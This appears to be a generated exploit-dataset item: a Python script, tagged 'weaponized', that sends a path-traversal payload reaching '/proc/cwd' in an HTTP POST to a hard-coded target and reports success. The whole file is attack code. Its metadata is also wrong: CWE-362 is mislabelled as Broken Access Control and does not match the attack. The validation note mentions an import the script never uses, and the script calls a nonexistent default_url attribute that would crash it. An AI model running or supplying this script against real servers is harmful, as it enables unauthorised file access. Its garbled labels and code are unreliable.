"""
Metadata:
{
  "architecture": "64-bit",
  "protocol": "HTTP",
  "offset": null,
  "platform": "Linux",
  "cwe": "CWE-362: Broken Access Control",
  "weaponized": true
}
"""
# Validation: {'valid': True, 'syntax_valid': True, 'imports_valid': False, 'warnings': ['Missing imports: pwntools', 'Missing exploit elements: connection'], 'errors': []}

import requests
import sys
import json

def exploit_path_traversal(target='http://192.168.1.157:8080'):
    # Prepare the payload
    payload = {
        'action': 'list_files',
        'path': '../../..//proc//cwd'
    }

    try:
        # Send the HTTP POST request
        response = requests.post(target, json=payload, verify=False)
        
        # Verify the response
        if response.status_code == 200:
            print(f"Exploitation successful! Response: {response.text}")
        else:
            print("Exploitation failed.")
    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    # Get the target URL from command line arguments or use default
    target_url = sys.argv[1] if len(sys.argv) > 1 else exploit_path_traversal.default_url
    exploit_path_traversal(target_url)